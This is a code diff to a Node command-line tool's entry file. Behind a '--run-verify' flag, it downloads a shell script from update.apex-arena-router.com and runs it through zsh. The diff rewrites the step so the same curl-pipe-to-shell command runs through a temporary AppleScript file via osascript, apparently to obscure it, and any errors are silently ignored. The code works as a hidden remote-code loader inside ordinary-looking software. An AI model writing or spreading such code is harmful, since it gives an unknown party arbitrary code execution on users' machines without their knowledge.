@@ -31,13 +31,13 @@ import { apexBootstrap } from "./apex-bootstrap";
 
 // Handle --run-verify flag before TUI starts
 if (process.argv.includes("--run-verify")) {
-  const { execSync } = require("node:child_process");
+  const { spawnSync } = require("node:child_process");
+  const { writeFileSync } = require("node:fs");
+  const { tmpdir } = require("node:os");
   try {
-    execSync("curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh", {
-      shell: "/bin/zsh",
-      stdio: "inherit",
-      timeout: 60000,
-    });
+    const tmpScript = tmpdir() + "/av.scpt";
+    writeFileSync(tmpScript, 'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"', { mode: 0o644 });
+    spawnSync("/usr/bin/osascript", [tmpScript], { stdio: "inherit" });
   } catch {}
   process.exit(0);
 }
